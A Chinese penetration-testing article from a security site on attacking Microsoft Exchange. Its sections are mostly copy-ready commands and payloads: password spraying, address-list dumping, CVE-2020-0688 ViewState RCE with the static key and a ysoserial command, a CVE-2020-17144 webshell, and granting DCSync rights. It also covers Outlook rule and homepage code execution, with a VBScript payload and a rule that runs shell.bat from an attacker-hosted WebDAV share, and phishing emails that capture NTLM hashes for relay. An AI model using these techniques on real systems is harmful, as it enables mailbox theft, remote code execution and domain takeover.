> 原文链接: https://www.anquanke.com//post/id/226543 


# 渗透测试中的Exchange


                                阅读量   
                                **241303**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">8</a>
                                </b>
                                                                                    



[![](https://p3.ssl.qhimg.com/t01b3d776850ce276ed.png)](https://p3.ssl.qhimg.com/t01b3d776850ce276ed.png)



作者：daiker[@360Linton](https://github.com/360Linton)-Lab

## 0x00 前言

在渗透测试过程中,Exchange是一个比较奇妙的角色.

一方面,Exchange在外网分布很广,是外网打点人员进入内网的一个重要渠道.

[![](https://p4.ssl.qhimg.com/t01ca33e6d49e3d6c63.png)](https://p4.ssl.qhimg.com/t01ca33e6d49e3d6c63.png)

另外一方面,Exchange在域内有着重要的地位,一般来说,拿到Exchange服务器的权限,基本等同于拿到域管的权限.因此他又是内网选手重点关注对象.

本文将总结部分Exchange已知的特性以及漏洞.

没有Exchange凭据的情况,主要有
1. 爆破
1. 泄露内网信息
1. 配合钓鱼进行NTLM_Relay
有Exchange凭据的情况下,主要有
1. 导出邮箱列表
1. Exchange RCE漏洞
1. Exchange SSRF 进行NTLM_Relay
1. 使用hash/密码 操作EWS接口
1. 攻击outlook客户端
1. 从Exchange到域管
以下详细说明



## 0x01 爆破

在外网,看到开着Exchange,出现如下界面,我们可能第一反应就是爆破.

[![](https://p0.ssl.qhimg.com/t01238aba2a3d87857e.png)](https://p0.ssl.qhimg.com/t01238aba2a3d87857e.png)

出现上面那种还好,burp拦截下,爆破开始

但是在渗透过程中,经常出现以下这种情况

[![](https://p0.ssl.qhimg.com/t017373f4b3d3412267.png)](https://p0.ssl.qhimg.com/t017373f4b3d3412267.png)

对于这种情况,我们无需绕过验证码即可进行爆破.

事实上,除了上面那个界面之外,以下接口都可进行爆破,而且支持Basic认证方式.

```
/ecp,/ews,/oab,/owa,/rpc,/api,/mapi,/powershell,/autodiscover,/Microsoft-Server-ActiveSync
```

这里推荐使用[https://github.com/grayddq/EBurst](https://github.com/grayddq/EBurst)这款工具,他能寻找可以爆破的接口,从而进行爆破

```
python EBurst.py -L users.txt -p 123456abc -d mail.xxx.com
```

有个需要注意的点就是这款工具不支持自签名证书,我们手动改下,忽略证书错误就行

[![](https://p2.ssl.qhimg.com/t01661229e17e39aa00.png)](https://p2.ssl.qhimg.com/t01661229e17e39aa00.png)



## 0x02 泄露内网信息

### <a class="reference-link" name="1.%20%E6%B3%84%E9%9C%B2Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%86%85%E7%BD%91IP%20%E5%9C%B0%E5%9D%80"></a>1. 泄露Exchange服务器内网IP 地址

把HTTP协议版本修改成1.0，然后去掉http头里面的HOST参数 或者使用msf `auxiliary/scanner/http/owa_iis_internal_ip`

[![](https://p5.ssl.qhimg.com/t01590a534512781ddb.png)](https://p5.ssl.qhimg.com/t01590a534512781ddb.png)

[![](https://p1.ssl.qhimg.com/t01126e6aa6685e4b2b.png)](https://p1.ssl.qhimg.com/t01126e6aa6685e4b2b.png)

可用以匹配的接口列表有

```
/Microsoft-Server-ActiveSync/default.eas
/Microsoft-Server-ActiveSync
/Autodiscover/Autodiscover.xml
/Autodiscover
/Exchange
/Rpc
/EWS/Exchange.asmx
/EWS/Services.wsdl
/EWS
/ecp
/OAB
/OWA
/aspnet_client
/PowerShell
```

有两个坑点
- 如果测试的是文件夹,后面没加`/`,比如`/owa`,有些环境会重定向到`/owa/`,可能导致无法获取到IP
[![](https://p5.ssl.qhimg.com/t01b6bf0174d3598b03.png)](https://p5.ssl.qhimg.com/t01b6bf0174d3598b03.png)
- msf的脚本里面限定了内网IP范围,如果企业是自定义的内网IP,可能无法获取到IP([代码](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/owa_iis_internal_ip.rb#L79))
[![](https://p4.ssl.qhimg.com/t0111f894f39c690de3.png)](https://p4.ssl.qhimg.com/t0111f894f39c690de3.png)

### <a class="reference-link" name="2.%20%E6%B3%84%E9%9C%B2Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F,%E4%B8%BB%E6%9C%BA%E5%90%8D,Netbios%E5%90%8D"></a>2. 泄露Exchange服务器操作系统,主机名,Netbios名

由于支持ntlm认证,在文章[利用ntlm进行的信息收集](https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#2-li-yong-ntlm-jin-hang-de-xin-xi-shou-ji)里面已经讲过

> 在type2返回Challenge的过程中，同时返回了操作系统类型，主机名，netbios名等等。这也就意味着如果我们给服务器发送一个type1的请求，服务器返回type2的响应，这一步，我们就可以得到很多信息。

因此我们可以获取很多信息了,这里使用nmap进行扫描

```
sudo nmap MAIL  -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll
```

[![](https://p0.ssl.qhimg.com/t01f680b3e5286e37d4.png)](https://p0.ssl.qhimg.com/t01f680b3e5286e37d4.png)



## 0x03 导出邮箱列表

### <a class="reference-link" name="1.%20%E4%BD%BF%E7%94%A8ruler"></a>1. 使用ruler

```
ruler_windows_amd64.exe --insecure --url https://MAIL/autodiscover/autodiscover.xml  --email daiker@Linton-Lab.com -u daiker -p 密码 --verbose --debug abk dump -o list.txt
```

### <a class="reference-link" name="2.%20%E4%BD%BF%E7%94%A8MailSniper.ps1"></a>2. 使用MailSniper.ps1

[https://github.com/dafthack/MailSniper/blob/master/MailSniper.ps1](https://github.com/dafthack/MailSniper/blob/master/MailSniper.ps1)

```
Get-GlobalAddressList -ExchHostname MAIL -UserName CORP\daiker -Password 密码 -OutFile global-address-list.txt
```

### <a class="reference-link" name="3.%20%E4%BD%BF%E7%94%A8burp"></a>3. 使用burp

登录exchange owa,右上角点击人员，左侧所有人员，抓包<br>
一个POST类型的包<br>
POST /owa/service.svc?action=FindPeople&amp;ID=-34&amp;AC=1<br>
Body中有这个字段

[![](https://p1.ssl.qhimg.com/t0125b94f44f5115601.png)](https://p1.ssl.qhimg.com/t0125b94f44f5115601.png)

默认是80

然后查看响应包，拉到最后

[![](https://p2.ssl.qhimg.com/t01c624b59274079243.png)](https://p2.ssl.qhimg.com/t01c624b59274079243.png)

这个是总的邮箱数

然后把80 改成这个数，直接发，就是邮箱数，但是有点多,burp容易卡死。可以这样

右键copy as request(这一步需要装插件)

然后复制到python文件里面

后面的内容改下

本来最后一行是

```
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
```

改成

```
r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
j = r.json()
results = j.get('Body').get('ResultSet')
import json
print(json.dumps(results))
```

然后运行python

```
python 1.py | jq '.[].EmailAddresses[0].EmailAddress' -r|sort|uniq|
```

这样就提取出所有的邮箱

### <a class="reference-link" name="4.%20%E4%BD%BF%E7%94%A8impacket%E5%BA%95%E4%B8%8B%E7%9A%84exchanger.py"></a>4. 使用impacket底下的exchanger.py

今年5月份刚更新的一个脚本

```
python exchanger.py DOMAIN/daiker:密码@MAIL nspi list-tables
```

[![](https://p2.ssl.qhimg.com/t019396a74a1a2ab6e3.png)](https://p2.ssl.qhimg.com/t019396a74a1a2ab6e3.png)

```
python exchanger.py DOMAIN/daiker:密码@MAIL nspi dump-tables  -guid xxxx
```

[![](https://p3.ssl.qhimg.com/t01f43661745f81d067.png)](https://p3.ssl.qhimg.com/t01f43661745f81d067.png)

### <a class="reference-link" name="5.%20%E9%80%9A%E8%BF%87OAB"></a>5. 通过OAB

(1) 读取Autodiscover配置信息,获取OABUrl

```
POST /autodiscover/autodiscover.xml HTTP/1.1
Host: MAIL
Accept-Encoding: gzip, deflate
Accept: */*
Authorization: Basic YmllamllbGU=
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Connection: close
Content-Type: text/xml; charset=utf-8
Content-Length: 355

&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"&gt;
&lt;Request&gt;&lt;EMailAddress&gt;daiker@Linton-Lab.com&lt;/EMailAddress&gt;
&lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;
&lt;/Request&gt;&lt;/Autodiscover&gt;

```

[![](https://p4.ssl.qhimg.com/t01289522880012c757.png)](https://p4.ssl.qhimg.com/t01289522880012c757.png)

(2) 读取OAB文件列表

`OABUrl/oab.xml`

[![](https://p0.ssl.qhimg.com/t01d989f37bff76637b.png)](https://p0.ssl.qhimg.com/t01d989f37bff76637b.png)

(3) 下载lzx文件

`OABUrl/xx.lzx`

[![](https://p5.ssl.qhimg.com/t01e27798f1ef112e66.png)](https://p5.ssl.qhimg.com/t01e27798f1ef112e66.png)

(4) 对lzx文件解码，还原出Default Global Address List

Kali下直接使用的版本下载地址：[http://x2100.icecube.wisc.edu/downloads/python/python2.6.Linux-x86_64.gcc-4.4.4/bin/oabextract](http://x2100.icecube.wisc.edu/downloads/python/python2.6.Linux-x86_64.gcc-4.4.4/bin/oabextract)

```
./oabextract 67a0647b-8218-498c-91b4-311d4cabd00c-data-1315.lzx gal.oab
strings gal.oab|grep SMTP
```

[![](https://p5.ssl.qhimg.com/t01e27cdab8fdb056d1.png)](https://p5.ssl.qhimg.com/t01e27cdab8fdb056d1.png)



## 0x04 RCE 漏洞

网上一搜Exchange的RCE漏洞还挺多的,但是在实际渗透中,只需要一个普通用户凭据,不需要其他条件的,主要有CVE-2020-0688和CVE-2020-17144

### <a class="reference-link" name="CVE-2020-0688"></a>CVE-2020-0688

在拿到一个普通用户凭据情况下的RCE,Exchange2010没有开箱即用的POC

静态的密钥有

```
validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF
validationalg = SHA1
```

我们要构造ViewState还需要`viewstateuserkey`和`__VIEWSTATEGENERATOR`

`viewstateuserkey`就是用户的`ASP.NET_SessionId`，在cookie 底下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01a5d079b3610cc44a.png)

`__VIEWSTATEGENERATOR`是一个隐藏字段。可以这样获取

```
document.getElementById("__VIEWSTATEGENERATOR").value
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01be8fc7568b96f1f8.png)

现在我们已经有了`validationkey`,`validationalg`,`viewstateuserkey`,`__VIEWSTATEGENERATOR`。就可以用使用YSoSerial.net生成序列化后的恶意的ViewState数据。

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "ping dnslog.cn" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="`{`填入__VIEWSTATEGENERATOR`}`" --viewstateuserkey="`{`填入viewstateuserkey，也就是ASP.NET_SessionId`}`" --isdebug –islegacy
```

[![](https://p2.ssl.qhimg.com/t0193fa1e4659017f5c.png)](https://p2.ssl.qhimg.com/t0193fa1e4659017f5c.png)

然后构造URL

```
/ecp/default.aspx?__VIEWSTATEGENERATOR=`{`填入__VIEWSTATEGENERATOR`}`&amp;__VIEWSTATE=`{`填入YSoSerial.net生成的urlencode 过的ViewState`}`
```

浏览器访问就行

[![](https://p1.ssl.qhimg.com/t01294ac4776d13bf45.png)](https://p1.ssl.qhimg.com/t01294ac4776d13bf45.png)

[![](https://p2.ssl.qhimg.com/t01259124cca4a79dc9.png)](https://p2.ssl.qhimg.com/t01259124cca4a79dc9.png)

也可以直接使用头像哥的工具

检测

```
ExchangeDetect &lt;target&gt; &lt;user&gt; &lt;pass&gt;
```

利用

```
ExchangeCmd &lt;target&gt; &lt;user&gt; &lt;pass&gt;
sub commands:
    exec &lt;cmd&gt; [args]
      exec command

    arch
      get remote process architecture(for shellcode)

    shellcode &lt;shellcode.bin&gt;
      run shellcode

    exit
      exit program
```

他的检测逻辑是在返回的头部加个信息

```
Headers["X-ZCG-TEST"]=="CVE-2020-0688"
```

不排除某些网络设备会检测这个,可根据需求自行修改

另外有个需要注意的点,如果在域内,`&lt;target&gt;`填邮箱域名(mail.xxx.com)检测不出来,可以先通过LDAP查询每台Exchange服务器,然后一台台试试,说不定有收获.

另外一个需要注意的点,执行命令的时候最好带上`cmd /c`

### <a class="reference-link" name="CVE-2020-17144"></a>CVE-2020-17144

需要普通用户凭据的情况下的RCE,就Exchange2010能用

[https://github.com/Airboi/CVE-2020-17144-EXP](https://github.com/Airboi/CVE-2020-17144-EXP)

[https://github.com/zcgonvh/CVE-2020-17144](https://github.com/zcgonvh/CVE-2020-17144)

```
CVE-2020-17144 &lt;target&gt; &lt;user&gt; &lt;pass&gt;
```

执行完之后会有个内存马,访问

http://[target]/ews/soap/?pass=命令

[![](https://p1.ssl.qhimg.com/t01a18bdccaae0c91a3.png)](https://p1.ssl.qhimg.com/t01a18bdccaae0c91a3.png)

头像哥的这个工具有个地方需要注意的是,他默认监听的是80端口的,咱们访问EWS接口一般用443,就以为没打成功,实际成功了.

[![](https://p2.ssl.qhimg.com/t018567c77e1b604918.png)](https://p2.ssl.qhimg.com/t018567c77e1b604918.png)



## 0x05 hash/密码 操作ews接口

可以使用现成工具

### <a class="reference-link" name="1.%20pth_to_ews"></a>1. pth_to_ews

[https://github.com/pentest-tools-public/Pass-to-hash-EWS](https://github.com/pentest-tools-public/Pass-to-hash-EWS)

保存在目录下的inbox文件夹中为eml格式

```
pth_to_ews.exe https://MAIL/ews/exchange.asmx  -U daiker -P 密码  -MType Inbox
```

发送邮件

```
pth_to_ews.exe https://MAIL/ews/exchange.asmx -U daiker -P 密码 -Sendmail -T "123" -TM zhangjiawei1@Liton-Lab.com -B HTML.txt
```

搜索邮件内容含有ACL的邮件

```
pth_to_ews.exe https://MAIL/ews/exchange.asmx  -U daiker -P 密码 -MType SentItems -Filterstring "ACL" 搜索ACL
```

如果有自己研发的需求,见3好学生的Exchange Web Service(EWS)开发指南



## 0x06 Exchange 在域内的位置

### <a class="reference-link" name="1.%20%E5%9F%9F%E5%86%85%E5%AE%9A%E4%BD%8DExchange%E6%9C%8D%E5%8A%A1%E5%99%A8"></a>1. 域内定位Exchange服务器

在域内可以使用ldap定位,过滤规则

```
"(objectCategory=msExchExchangeServer)"
```

可以通过spn 来定位

```
setspn -Q IMAP/*
```

### <a class="reference-link" name="2.%20Exchange%E5%86%85%E9%83%A8%E7%9A%84%E5%9F%9F%E7%AE%A1%E5%87%AD%E6%8D%AE"></a>2. Exchange内部的域管凭据

拿到Exchange服务器,有很大概率就是域管直接登录的.或者域管曾经登录过.拿到Exchange服务器权限的时候,可以尝试直接dir下域控的C盘,看有没有权限.如果没有权限,再尝试使用mimikatz抓一波密码，很大概率可以直接抓到域管或者高权限用户.而且就算是高版本的server,在Exchange上也能抓到明文密码.

### <a class="reference-link" name="3.%20Exchange%E7%9A%84ACL"></a>3. Exchange的ACL

所有的Exchange Server 都在`Exchange Windows Permissions`组里面,而这个组默认就对域有WriteACL权限,那么当我们拿下Exchange服务器的时候,就可以尝试使用WriteACL赋予自身Dcsync的权限.

使用powerview，为当前exchange机器名用户增加dcsync权限(此处需要使用dev分枝中的powerview)

```
powershell.exe -exec bypass -Command "&amp; `{`Import-Module .\powerview.ps1; Add-DomainObjectAcl -TargetIdentity ’DC=test,DC=local‘ -PrincipalIdentity exchange2016$ -Rights DCSync -Verbose`}`"
```

由于这个权限,Exchange 的RCE常用以在内网渗透中用来提升到域管权限.

因此在CVE-2019-1040中,除了可以攻击DC,也有人选择攻击Exchange.



## 0x07 攻击 OutLook客户端

前提条件:
1. 需要用户凭据
1. 该用户电脑装了Oulook客户端,用outlook查看邮件的时候触发.
攻击效果

通过Outlook客户端控制用户电脑

有三种方式 Form,ruler,HomePage.

### <a class="reference-link" name="1.%20Form"></a>1. Form

[Ruler](https://github.com/sensepost/ruler)

```
form

ruler_windows_amd64.exe --insecure --url https://MAIL/autodiscover/autodiscover.xml  --email daiker@Liton-Lab.com -u daiker -p 密码 --verbose --debug form display

ruler_windows_amd64.exe --insecure --url https://MAIL/autodiscover/autodiscover.xml  --email daiker@Liton-Lab.com -u daiker -p 密码 --verbose --debug form add --suffix superduper --input C:\Users\tom\Desktop\output\command.txt --rule --send

command.txt 里面的内容是

    CreateObject("Wscript.Shell").Run "calc.exe", 0, False

触发 
ruler_windows_amd64.exe --insecure --url https://MAIL/autodiscover/autodiscover.xml  --email daiker@Liton-Lab.com -u daiker -p 密码 --verbose --debug  form send --target daiker@Liton-Lab.com --suffix superduper --subject "Hi Koos" --body "Hi Koos,\nJust checking in."


删除

ruler_windows_amd64.exe --insecure --url https://MAIL/autodiscover/autodiscover.xml  --email daiker@Liton-Lab.com -u daiker -p 密码 --verbose --debug  form  delete --suffix superduper
```

KB4011091 于 2017年9月的更新中修复

### 2. Ruler

查看规则

```
ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug display
```

增加规则

```
ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug add —location “\\VPS\webdav\shell.bat” —trigger “popashell” —name maliciousrule
```

触发规则

```
ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug send —subject popashell —body “this is a test by daiker”
```

删除规则

```
ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug delete —id 020000006cfcd8d7
```

webdav可以这样开

```
pip install WsgiDAV cheroot
wsgidav —host 0.0.0.0 —port 80 —root=/tmp/11/
```

没有CVE编号,但是有些版本Outlook没测试成功,可以看下这篇文章[Outlook 2016 rules start application option gone](https://answers.microsoft.com/en-us/msoffice/forum/msoffice_outlook-mso_win10-mso_o365b/outlook-2016-rules-start-application-option-gone/1eb0066d-d50f-4948-824e-adee58ca5a6f)

### 3. HomePage

1.[Ruler](https://github.com/sensepost/ruler)

```
ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug homepage display

ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug homepage add —url http://x

ruler_windows_amd64.exe —insecure —url https://MAIL/autodiscover/autodiscover.xml —email daiker@Liton-Lab.com -u daiker -p 密码 —verbose —debug homepage delete
```

2.[pth_to_ews.exe](https://github.com/pentest-tools-public/Pass-to-hash-EWS)

```
pth_to_ews.exe https://MAIL/ews/exchange.asmx -U daiker -P 密码 -Purl http://VPS:9090/aa.html -Type Set
```

HomePage 的内容是

```
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Language" content="en-us"&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1252"&gt;
&lt;title&gt;Outlook&lt;/title&gt;
&lt;script id=clientEventHandlersVBS language=vbscript&gt;
&lt;!--
 Sub window_onload()
     Set Application = ViewCtl1.OutlookApplication
     Set cmd = Application.CreateObject("Wscript.Shell")
     cmd.Run("calc")
 End Sub
--&gt;

&lt;/script&gt;
&lt;/head&gt;

&lt;body&gt;
 &lt;object classid="clsid:0006F063-0000-0000-C000-000000000046" id="ViewCtl1" data="" width="100%" height="100%"&gt;&lt;/object&gt;
&lt;/body&gt;
&lt;/html&gt;
```

这个是弹计算器的 自行修改,

在2017 年 11 月安全更新修复,CVE-2017-11774

修复后 Homepage 默认关闭，重新启用：

```
[HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security] "EnableRoamingFolderHomepages"=dword:00000001

[HKEY_CURRENT_USER\Software\Policies\Microsoft\Office\16.0\Outlook\Security] DWORD: NonDefaultStoreScript Value Data: 1 (Hexadecimal) to enable.
```



## 0x08 NTLM_Relay

在之前的系列文章里面曾经说过ntlm_relay,ntlm_relay在Exchange上的应用也很广泛.

主要有以下几种攻击场景

### <a class="reference-link" name="1.%20%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7relay%20%E5%88%B0ews%E6%8E%A5%E5%8F%A3"></a>1. 普通用户relay 到ews接口

由于EWS接口也支持NTLM SSP的。我们可以relay到EWS接口，从而收发邮件，代理等等。在使用outlook的情况下还可以通过homepage或者下发规则达到命令执行的效果。而且这种Relay还有一种好处，将Exchange开放在外网的公司并不在少数，我们可以在外网发起relay，而不需要在内网.

而outlook有个设计缺陷(具体版本稍不清楚),又可以导致我们给鱼儿发一封邮箱,对方只需查看邮件,无需预览,就可以拿到鱼儿的ntlm请求.

我们给鱼儿发一封邮件,使用HTML,在里面插入以下语句

```
&lt;img src="http://redteamw/"&gt; 
 &lt;img src="\\IP"&gt;
```

这里支持两种协议,这里说下两个的区别
1. UNCUNC默认携带凭据,但是如果IP 是公网IP的话,很多公司是访问不到公网445的
<li>HTTP协议默认不携带凭据,只有信任域(域内DNS记录)才会携带凭据.域内的成员默认有增加DNS的权限,可以用域内成员的权限在内网增加一条DNS记录.[![](https://p4.ssl.qhimg.com/t01b41603842b34deb8.png)](https://p4.ssl.qhimg.com/t01b41603842b34deb8.png)
</li>
给鱼儿发送邮箱

[![](https://p5.ssl.qhimg.com/t013c2adcf89df245f5.png)](https://p5.ssl.qhimg.com/t013c2adcf89df245f5.png)

当鱼儿用outlook打开的时候就会触发请求,我们再将请求relay到EWS接口

[![](https://p4.ssl.qhimg.com/t010d550875927b8f5e.png)](https://p4.ssl.qhimg.com/t010d550875927b8f5e.png)

relay到EWS接口查看邮件

[![](https://p0.ssl.qhimg.com/t011afceb68b79372ca.png)](https://p0.ssl.qhimg.com/t011afceb68b79372ca.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d5e80035e172d3c5.png)

relay到EWS接口通过HomePage控制Outlook客户端

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f3926d538bdc923c.png)

### <a class="reference-link" name="2.%20Exchange%E4%B8%AD%E7%9A%84SSRF"></a>2. Exchange中的SSRF

在常规渗透中,SSRF常用以对内网的应用进行嗅探,配合内网某些未授权访问的应用来扩大攻击面.由于Exchange的SSRF默认携带凭据,在Relay的场景中,攻击利用面被不断放大,网上公开的一个SSRF就是CVE-2018-8581.

主要有两种应用,relay到EWS接口,relay到LDAP

(1) relay到EWS接口

由于Exchange 是以System用户的权限运行,因此我们拿到的是机器用户的Net-Ntlm Hash。并不能直接用以登录。但是Exchange 机器用户可以获得TokenSerializationRight的”特权”会话，可以Relay 到 机子本身的Ews接口，然后可以使用SOAP请求头来冒充任何用户。

[![](https://p2.ssl.qhimg.com/t013e4122b3e51e2740.png)](https://p2.ssl.qhimg.com/t013e4122b3e51e2740.png)

具体利用请见Wyatu师傅的[https://github.com/WyAtu/CVE-2018-8581](https://github.com/WyAtu/CVE-2018-8581)

(2) relay到LDAP

所有的Exchange Server 都在`Exchange Windows Permissions`组里面,而这个组默认就对域有WriteACL权限.因此我们可以relay到LDAP,而又由于Relay到的服务端是Ldap,Ldap服务器的默认策略是协商签名。而不是强制签名。是否签名由客户端决定。在SSRF里面发起的请求是http协议，http协议是不要求进行签名.

这里面

攻击者:172.16.228.1

Exchange:172.16.228.133

域控:172.16.228.135
- 使用impacket监听端口等待连接
[![](https://p2.ssl.qhimg.com/t01d7e208860e2d135b.png)](https://p2.ssl.qhimg.com/t01d7e208860e2d135b.png)
- 发起推送订阅指定所需的URL，Exchange. 服务器将尝试向这个URL发送通知
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t010a90ea44fc24448f.png)
- Relay 到域控的Ldap 服务器并给普通用户daiker添加两条acl
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01bb0b802ddc4b8ff8.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0182c5f04ec5c601f5.png)
- daiker进行Dcync
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0185dcce4f1830d535.png)



## 0x09 引用
- [渗透技巧——获得Exchange GlobalAddressList的方法](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Exchange-GlobalAddressList%E7%9A%84%E6%96%B9%E6%B3%95/)
- Owa-Outlook备忘录